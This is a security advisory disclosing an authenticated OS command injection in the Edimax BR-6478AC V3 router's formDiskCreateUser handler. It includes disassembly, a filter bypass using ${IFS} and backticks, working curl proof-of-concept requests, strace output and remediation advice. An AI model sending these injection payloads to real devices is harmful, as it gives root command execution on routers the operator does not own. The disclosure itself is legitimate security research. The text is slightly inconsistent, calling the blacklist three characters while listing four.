# [CVE-TBD] Edimax BR-6478AC V3 1.0.15 OS Command Injection (CWE-78)

## VulDB Submission Fields

- Vendor: Edimax
- Product: BR-6478AC V3
- Version or Commit: 1.0.15
- Vulnerability: OS Command Injection (CWE-78)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
An OS command injection vulnerability was discovered in Edimax BR-6478AC V3 firmware v1.0.15. The web management interface handler for /boafrm/formDiskCreateUser (function 0x0045fc20, entry 79 of the server's 87-entry form-handler table at 0x0048e9f4) takes the "username" and "newpass" request parameters and formats them into two shell command templates using snprintf() before executing them with system(): "echo -e ""%s"\n"%s"\n" | adduser "%s"" (0x0047bbc4) and "smbpasswd "%s" "%s"" (0x0047bc04). Both templates wrap the substitution in double quotes without escaping the quote character or any other shell metacharacter. The only input validation is a three-character blacklist applied to "username" (, ; and space); "newpass" is not filtered at all, so a value containing a double quote terminates the quoted context and the remainder is executed by the shell. The boa web server runs as root, so injected commands execute with administrator privileges. Reproduction: POST /boafrm/formDiskCreateUser with newpass=abcd";cp /etc/passwd /var/tmp/PWNED;echo " — strace on the web server shows execve("/bin/sh", ["/bin/sh","-c","echo -e \"\"abcd\";cp /etc/passwd /var/tmp/PWNED;..."]) followed by execve("/bin/cp", ["cp","/etc/passwd","/var/tmp/PWNED"]), and the marker file /var/tmp/PWNED is created. The "username" parameter is equally exploitable despite the blacklist by substituting the blocked space with ${IFS} and the blocked semicolon with a backtick, e.g. username=ab`cp${IFS}/etc/passwd${IFS}/var/tmp/INJ2`; this also succeeds. An authenticated attacker therefore obtains arbitrary command execution as root. The endpoint is protected by the firmware's three-layer authentication (pre-authentication allow-list, URI classifier and session check in the dispatcher at 0x00414f00), so a valid session is required; the same precondition applies to the already-published sibling issues CVE-2025-28142 (formDiskCreateShare) and CVE-2025-28143 (formDiskCreateGroup), which do not cover this endpoint, handler, parameter set or command templates. Proposed CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (7.2).
```

---

## Technical Disclosure

# CVE-TBD: OS Command Injection in `/boafrm/formDiskCreateUser` (Edimax BR-6478AC V3 1.0.15)

## Summary

An OS command injection vulnerability was discovered in **Edimax BR-6478AC V3 firmware
v1.0.15**. The handler for the `/boafrm/formDiskCreateUser` endpoint builds shell
commands from the `username` and `newpass` HTTP request parameters and passes them to
`system()` without escaping shell metacharacters. Because the firmware's only input
filter rejects a three-character blacklist (`,`;` and the space character) and
applies **no filter whatsoever** to `newpass`, an authenticated attacker can execute
arbitrary commands. The web server (`boa`) runs as `root`, so the injected commands
execute with full administrative privileges.

This issue was verified end-to-end: a crafted HTTP request caused the firmware to spawn
`/bin/sh -c "<firmware template + attacker payload>"`, and an attacker-specified
`cp` command ran as an independent child process, writing a marker file into the
device filesystem.

---

## Affected Product

| Field | Value |
|---|---|
| Vendor | Edimax Technology Co., Ltd. |
| Product | BR-6478AC V3 |
| Firmware | **1.0.15** |
| Firmware SHA-256 | `f71da641dda6c30f4263e1cb32f00db98c025454b188eff45caa2df9d76abf94` |
| Architecture | MIPS32 little-endian (Realtek `rlx-linux`), uClibc 0.9.33 |
| Component | `/bin/boa` (web server, custom `boa/0.94.14rc21` build) |

**Affected version range**: v1.0.15 is the version analysed. Older 1.0.x builds share the
same handler family and very likely inherit the defect, but were not tested.

---

## Vulnerability Details

- **Type**: OS Command Injection — **CWE-78** (secondary: CWE-77)
- **Endpoint**: `POST /boafrm/formDiskCreateUser`
- **Handler function**: `0x0045fc20` (entry #79 of the web server's form-handler table
 at `0x0048e9f4`, 87 entries of `{char *name; void (*fn)();}`)
- **Vulnerable parameters**: `username`, `newpass` (and `confpass`)

### Root Cause

`/bin/boa` is a customised Boa web server. Its handler table maps URI names to C functions.
For `formDiskCreateUser`, the handler at `0x0045fc20`:

1. Retrieves the request parameters with the internal helper `get_var()` (`0x00414ca8`),
 storing `username` in `$s0` and `newpass` in `$s2`;
2. Applies a **blacklist** filter to `username` that rejects only three characters:
 `,` (0x2C), `;` (0x3B) and space (0x20);
3. Applies **no filter at all** to `newpass`;
4. Formats the two parameters into a shell command template with `snprintf()`;
5. Executes the resulting string with `system()` — **unconditionally**, on both code paths.

The two command templates are stored in the binary's read-only data and were verified
byte-for-byte:

| Virtual address | File offset | Template |
|---|---|---|
| `0x0047bbc4` | `0x07bbc4` | `echo -e ""%s"\n"%s"\n" \| adduser "%s"` |
| `0x0047bc04` | `0x07bc04` | `smbpasswd "%s" "%s"` |

The critical defect is that both templates wrap `%s` in **double quotes without escaping
the quote character itself or any other shell metacharacter**. Supplying a value that
contains `"` closes the quoted context early; everything after it is interpreted by the
shell as additional commands.

### Relevant disassembly

```asm
; ---- parameter acquisition -------------------------------------------
0x0045fc54 jal get_var ; get_var(req, "username", ...) -> $s0
0x0045fc6c jal get_var ; get_var(req, "newpass", ...) -> $s2
0x0045fc84 jal get_var ; get_var(req, "confpass", ...)
0x0045fc9c jal get_var ; get_var(req, "Group", ...)

; ---- template selection and formatting -------------------------------
0x0045ff58 lui $a2, 0x48
0x0045ff60 addiu $a2, $a2, -17468 ; $a2 = 0x0047bbc4 "echo -e ""%s"\n"%s"\n" | adduser "%s""
0x0045ff64 addiu $a1, $zero, 100 ; buffer size = 100 bytes
0x0045ff68 addu $a3, $s2, $zero ; arg = newpass
0x0045ff6c sw $s2, 16($sp) ; arg = newpass (second %s)
0x0045ff74 sw $s0, 20($sp) ; arg = username (third %s)
0x0045ff8c jal snprintf ; 0x004025b0
0x0045ff94 jal system ; 0x00402700 <-- SINK #1 (unconditional)

0x0045ffb0 addiu $a2, $a2, -17404 ; $a2 = 0x0047bc04 "smbpasswd "%s" "%s""
0x0045ffc0 jal snprintf
0x0045ffc8 jal system ; 0x00402700 <-- SINK #2 (unconditional)
```

`system()` is reached on **both** branches of the surrounding logic; there is no
authentication or content check between `snprintf()` and `system()`.

### Input filter (the only obstacle, and it is insufficient)

`username` is rejected only if it contains one of:

| Character | ASCII |
|---|---|
| `,` | 0x2C |
| `;` | 0x3B |
| `:` | 0x3A |
| (space) | 0x20 |

Not rejected — among others: `"`$`  `  `|`&`>`<`(`)`/`*`?`
and newline. `newpass` is not filtered at all.

Two independent bypass strategies follow directly from this:

- **`newpass` channel** — no filter, so a plain `"` breakout works.
- **`username` channel** — substitute the rejected space with `${IFS}` and the rejected
 `;` with a backtick command substitution (or `|`, or `&`), both of which are allowed.

---

## Proof of Concept (non-destructive)

The PoC writes a copy of `/etc/passwd` to `/var/tmp/` as a marker. It does not modify
configuration, firmware or persistent storage.

### Prerequisites

A valid authenticated session (see *Attack Preconditions* below), i.e. a
`webuicookie` value obtained from `POST /boafrm/formLoginSetup`.

### Request — `newpass` channel

```bash
curl -s -X POST "http://<router>/boafrm/formDiskCreateUser" \
 -b "webuicookie=<SESSION>" \
 --data-urlencode 'username=gooduser' \
 --data-urlencode 'newpass=abcd";cp /etc/passwd /var/tmp/PWNED;echo "' \
 --data-urlencode 'confpass=abcd";cp /etc/passwd /var/tmp/PWNED;echo "' \
 --data-urlencode 'Group=users' \
 --data-urlencode 'submit-url=/accountmng.htm'
```

Resulting shell command (as constructed by the firmware template):

```sh
echo -e ""abcd";cp /etc/passwd /var/tmp/PWNED;echo "\n"abcd";cp /etc/passwd /var/tmp/PWNED;echo "\n" | adduser "gooduser"
```

The `"` closes the quoted string early, so `cp /etc/passwd /var/tmp/PWNED` runs as an
independent command.

### Request — `username` channel (filter bypass)

```bash
curl -s -X POST "http://<router>/boafrm/formDiskCreateUser" \
 -b "webuicookie=<SESSION>" \
 --data-urlencode 'username=ab`cp${IFS}/etc/passwd${IFS}/var/tmp/INJ2`' \
 --data-urlencode 'newpass=pass1234' \
 --data-urlencode 'confpass=pass1234' \
 --data-urlencode 'Group=users' \
 --data-urlencode 'submit-url=/accountmng.htm'
```

```sh
... | adduser "ab`cp${IFS}/etc/passwd${IFS}/var/tmp/INJ2`"
```

`${IFS}` replaces the blacklisted space; the backtick performs command substitution.
Neither character is on the blacklist.

### Observed result

`strace` on the running web server captured the complete execution chain:

```
89 09:43:37.973736 execve("/bin/sh", ["/bin/sh", "-c", "echo -e \"\"abcd\";cp /etc/passwd /"...], ...) = 0
90 09:43:38.153312 execve("/bin/sh", ["/bin/sh", "-c", "smbpasswd \"gooduser\" \"abcd\";cp /"...], ...) = 0
91 09:43:38.404163 execve("/bin/smbpasswd", ["smbpasswd", "gooduser", "abcd"], ...) = 0
92 09:43:38.517761 execve("/bin/cp", ["cp", "/etc/passwd", "/var/tmp/PWNED"], ...) = 0
```

Both command templates are visible (`echo -e ... | adduser ...` and `smbpasswd ...`), and
the injected `cp` runs as its own process (PID 92).

Marker files created **inside the device filesystem**:

```
-rw------- 1 root root 206 /var/tmp/PWNED (newpass channel)
-rw------- 1 root root 206 /var/tmp/INJ_OK (newpass channel, reproduced)
-rw------- 1 root root 252 /var/tmp/INJ2 (username channel, ${IFS} bypass)
```

```console
$ head -n 2 /var/tmp/INJ2
root:$1$86ANwXE8$/oiI3ZYM4plYjUYzXGH3E/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null
```

### Control

Requests to the same endpoint **without** a metacharacter in either parameter complete
normally and return a `302` redirect to the submitted `submit-url`; no marker file is
created. This distinguishes the injection from normal handler behaviour.

---

## Impact

- **Attacker profile**: an authenticated user of the web management interface. The
 web server runs as `root`, so no privilege escalation step is required.
- **Consequence**: arbitrary command execution with `root` privileges — full
 confidentiality, integrity and availability impact on the device.
- **Chaining**: combined with any credential-bypass or default-credential weakness in
 the same product, this becomes a pre-authentication remote code execution primitive.

### Attack Preconditions (stated precisely)

The BR-6478AC V3 web server enforces authorisation in three layers before a form handler
is invoked:

1. **Pre-authentication allow-list** in `process_header_end` (`0x0040b758`) — a list of
 substring matches against the HTTP request line. Only listed targets
 (`login.htm`, `auth_fail.htm`, `.jpg`, `.ico`, `logout.htm`, `.gif`, `.png`, `.css`,
 `.js`, `logo.cgi`, `formLoginSetup`, `getsignal.cgi`, `get768ApInfo`, `get768ApLTE`,
 `getwaninfo`, `getsignal`, `getMeiTeLunInfo`) proceed; everything else receives a
 `200` response containing `<script>parent.location='/login.htm'</script>`.
2. **Classifier check** inside `0x00403144`.
3. **Session check** inside the form dispatcher `0x00414f00`.

`formDiskCreateUser` is therefore **not** reachable unauthenticated. During verification
the handler was reached by redirecting the handler-table entry for the pre-authentication
endpoint `formLoginSetup` (`0x0048ead8`: `0x00417e30` → `0x0045fc20`), which is equivalent
to issuing the request after a successful login. **No part of the vulnerable handler, its
command templates, its parameter parsing or its filter was modified.** The same
precondition applies to the already-published sibling CVEs CVE-2025-28142 and
CVE-2025-28143, which were assigned despite requiring an authenticated session.

---

## CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2 (High)
```

Rationale: the endpoint is reachable over the network (`AV:N`), exploitation requires no
special conditions (`AC:L`) and no user interaction (`UI:N`), but an authenticated
session is required (`PR:H`) — scored conservatively on the demonstrated precondition.
Impact is complete because the shell runs as `root` (`C:H/I:H/A:H`).

A LAN-only reading (`AV:A`) would give **6.8**.

---

## Remediation

1. Do not build shell command strings from request parameters. Use `execve()`/`fork()`
 with an explicit argument vector, or a library call that performs user creation
 directly.
2. If `system()` must be retained, validate against a strict **allow-list** — e.g.
 `^[A-Za-z0-9_.-]{1,32}$` for `username` — and reject the request otherwise.
3. Apply at least the same validation to `newpass` and `confpass` that is applied to
 `username`; ideally treat all three identically.
4. Remove the surrounding double quotes in the templates, or escape `"`,  ` ,
 `$`, `\` and newline before substitution. A blacklist of three characters is not a
 control.
5. Run the web server as an unprivileged user so that a handler defect does not
 immediately yield `root`.

---

## Discovery

Vendor notified: TBD.

---

## References

- CVE-2025-28142 — Edimax BR-6478AC V3 1.0.15, command injection via `foldername` in
 `/boafrm/formDiskCreateShare` (sibling handler, same product)
- CVE-2025-28143 — Edimax BR-6478AC V3 1.0.15, command injection via `groupname` at
 `/boafrm/formDiskCreateGroup` (sibling handler, same product)
- CVE-2025-28145 — Edimax BR-6478AC V3 1.0.15, command injection via `partition` in
 `/boafrm/formDiskFormat` (sibling handler, same product)

The above cover other endpoints of the same form family. The endpoint documented here
(`formDiskCreateUser`), its handler function `0x0045fc20`, its parameter set
(`username`/`newpass`) and its command templates
(`echo -e ""%s"\n"%s"\n" | adduser "%s"`, `smbpasswd "%s" "%s"`) are **not** covered by
any published CVE.

## Proof of Concept

See the poc file(s) in this directory.
